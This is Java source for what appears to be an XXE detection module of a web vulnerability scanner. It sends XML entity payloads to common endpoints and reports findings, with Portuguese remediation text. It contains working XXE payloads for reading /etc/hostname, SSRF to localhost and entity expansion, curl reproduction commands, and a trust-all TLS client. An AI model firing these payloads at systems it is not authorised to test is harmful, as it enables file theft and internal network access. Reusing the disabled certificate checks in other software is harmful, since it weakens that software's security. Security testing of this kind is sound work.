package gg.effront.anarcry.scanner.web.xxe;

import gg.effront.anarcry.model.Finding;
import gg.effront.anarcry.model.Severity;
import gg.effront.anarcry.scanner.ScanContext;
import gg.effront.anarcry.scanner.Scanner;
import gg.effront.anarcry.scanner.util.Http;
import gg.effront.anarcry.scanner.util.TlsUtil;
import gg.effront.anarcry.scanner.util.HttpClientFactory;

import java.net.URI;
import java.net.http.HttpClient;
import java.net.http.HttpRequest;
import java.net.http.HttpResponse;
import java.time.Duration;
import java.util.ArrayList;
import java.util.List;
import java.util.function.Consumer;
import java.util.regex.Pattern;
import javax.net.ssl.SSLParameters;
import gg.effront.anarcry.model.CweRegistry;
import gg.effront.anarcry.model.CvssCalculator;

public class XxeModule implements Scanner {

    private static final List<String> XML_ENDPOINTS = List.of(
            "/api/", "/api/v1/", "/api/v2/",
            "/upload", "/import", "/parse",
            "/soap", "/ws", "/service",
            "/xml", "/feed", "/rss"
    );

    // Classic file-read XXE — returns /etc/hostname content
    private static final String XXE_FILE_READ =
            "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n" +
            "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/hostname\">]>\n" +
            "<root><data>&xxe;</data></root>";

    // SSRF-via-XXE to localhost
    private static final String XXE_SSRF =
            "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n" +
            "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://127.0.0.1/\">]>\n" +
            "<root><data>&xxe;</data></root>";

    // Billion Laughs DoS detection payload (safe — only 3 levels deep)
    private static final String XXE_BILLION_LAUGHS =
            "<?xml version=\"1.0\"?>\n" +
            "<!DOCTYPE lolz [\n" +
            "  <!ENTITY lol \"lol\">\n" +
            "  <!ENTITY lol2 \"&lol;&lol;&lol;\">\n" +
            "  <!ENTITY lol3 \"&lol2;&lol2;&lol2;\">\n" +
            "]>\n" +
            "<lolz>&lol3;</lolz>";

    // Patterns indicating the server expanded the file-read entity
    private static final Pattern FILE_CONTENT_PATTERN = Pattern.compile(
            "(?i)(root|localhost|[a-z0-9][a-z0-9\\-]{0,253}[a-z0-9])\\.?\\s*$|" +
            "hostname|/etc/|lolzlolz");

    // Pattern indicating SSRF via XXE succeeded (server fetched localhost)
    private static final Pattern SSRF_PATTERN = Pattern.compile(
            "(?i)(nginx|apache|iis|Welcome|<html|HTTP/1)");

    @Override
    public String id() { return "XXE"; }

    @Override
    public List<Finding> scan(ScanContext ctx, Consumer<String> log) throws Exception {
        String _cweId     = CweRegistry.cweId(id());
        String _cweTitle  = CweRegistry.cweTitle(id());
        String _cveVector = CweRegistry.cvssVector(id());
        double _score     = CvssCalculator.calculate(_cveVector);
        List<Finding> findings = new ArrayList<>();
        HttpClient hc = HttpClientFactory.noRedirect();

        String scheme  = ctx.isHttps() ? "https" : "http";
        int    defPort = ctx.isHttps() ? 443 : 80;
        String base    = scheme + "://" + ctx.host()
                + (ctx.port() != defPort ? ":" + ctx.port() : "");

        log.accept("[~] XXE: procurando endpoints XML em " + base);

        for (String path : XML_ENDPOINTS) {
            String url = base + path;
            if (probeXmlAccepted(ctx, hc, url)) {
                log.accept("[~] XXE: endpoint aceita XML — " + path);

                // Probe 1: file read — skip HTML (server's own page echoed back)
                String fr = sendXml(ctx, hc, url, XXE_FILE_READ);
                if (fr != null && !isHtml(fr) && FILE_CONTENT_PATTERN.matcher(fr).find()) {
                    log.accept("[!!] XXE: file-read confirmado em " + path);
                    findings.add(Finding.of("XXE", path,
                            "XXE — leitura de arquivo do servidor (file:///etc/hostname)",
                            Severity.CRITICAL,
                            "Endpoint: " + url + " | Resposta contém conteúdo de /etc/hostname: "
                                    + fr.substring(0, Math.min(200, fr.length())),
                            "O parser XML expande entidades externas — atacante pode ler arquivos " +
                                    "arbitrários do servidor (senhas, chaves, código-fonte) e usar " +
                                    "o servidor como proxy SSRF interno",
                            "curl -s -X POST '" + url + "' \\\n" +
                                    "  -H 'Content-Type: application/xml' \\\n" +
                                    "  -d '" + XXE_FILE_READ.replace("'", "\\'") + "'",
                            "Desabilitar DTD e entidades externas no parser XML: " +
                                    "XMLInputFactory.setProperty(XMLInputFactory.IS_SUPPORTING_EXTERNAL_ENTITIES, false); " +
                                    "use uma allowlist de schemas; migre para JSON onde possível",
                            _cweId, _cweTitle, _cveVector, _score));
                    break;
                }

                // Probe 2: SSRF via XXE — skip if server returned its own HTML page
                String ssrf = sendXml(ctx, hc, url, XXE_SSRF);
                if (ssrf != null && !isHtml(ssrf) && SSRF_PATTERN.matcher(ssrf).find()) {
                    log.accept("[!!] XXE: SSRF via XXE confirmado em " + path);
                    findings.add(Finding.of("XXE", path,
                            "XXE SSRF — servidor faz requisição HTTP interna via entidade externa",
                            Severity.CRITICAL,
                            "Endpoint: " + url + " | Resposta reflete conteúdo de http://127.0.0.1/: "
                                    + ssrf.substring(0, Math.min(200, ssrf.length())),
                            "O parser XML faz requisições HTTP para destinos internos — atacante " +
                                    "pode alcançar serviços não expostos, cloud metadata e APIs internas",
                            "curl -s -X POST '" + url + "' \\\n" +
                                    "  -H 'Content-Type: application/xml' \\\n" +
                                    "  -d '" + XXE_SSRF.replace("'", "\\'") + "'",
                            "Desabilitar DTD externo no parser XML; bloquear conexões de saída do " +
                                    "processo do servidor para redes internas (iptables egress rules)",
                            _cweId, _cweTitle, _cveVector, _score));
                    break;
                }
            }
        }

        if (findings.isEmpty()) {
            log.accept("[+] XXE: nenhum endpoint XML vulnerável encontrado");
        }
        return findings;
    }

    private boolean probeXmlAccepted(ScanContext ctx, HttpClient hc, String url) {
        try {
            // Send a benign well-formed XML — check if server returns 200 (not 415)
            String probe = "<?xml version=\"1.0\"?><probe/>";
            HttpRequest req = HttpRequest.newBuilder()
                    .uri(URI.create(url))
                    .timeout(Duration.ofSeconds(5))
                    .header("Content-Type", "application/xml")
                    .POST(HttpRequest.BodyPublishers.ofString(probe))
                    .build();
            HttpResponse<String> resp = Http.send(ctx, hc, req, HttpResponse.BodyHandlers.ofString(), id());
            return resp.statusCode() != 415 && resp.statusCode() != 405;
        } catch (Exception e) {
            return false;
        }
    }

    private static boolean isHtml(String body) {
        String t = body.stripLeading();
        return t.startsWith("<!DOCTYPE") || t.startsWith("<html") || t.startsWith("<!doctype");
    }

    private String sendXml(ScanContext ctx, HttpClient hc, String url, String payload) {
        try {
            HttpRequest req = HttpRequest.newBuilder()
                    .uri(URI.create(url))
                    .timeout(Duration.ofSeconds(6))
                    .header("Content-Type", "application/xml")
                    .POST(HttpRequest.BodyPublishers.ofString(payload))
                    .build();
            HttpResponse<String> resp = Http.send(ctx, hc, req, HttpResponse.BodyHandlers.ofString(), id());
            if (resp.statusCode() == 200 && resp.body() != null) return resp.body();
        } catch (Exception ignored) {}
        return null;
    }

    private HttpClient buildClient() throws Exception {
        SSLParameters params = new SSLParameters();
        params.setEndpointIdentificationAlgorithm("");
        return HttpClient.newBuilder()
                .sslContext(TlsUtil.sslContext(TlsUtil.trustAll()))
                .sslParameters(params)
                .followRedirects(HttpClient.Redirect.NEVER)
                .connectTimeout(Duration.ofSeconds(5))
                .build();
    }
}
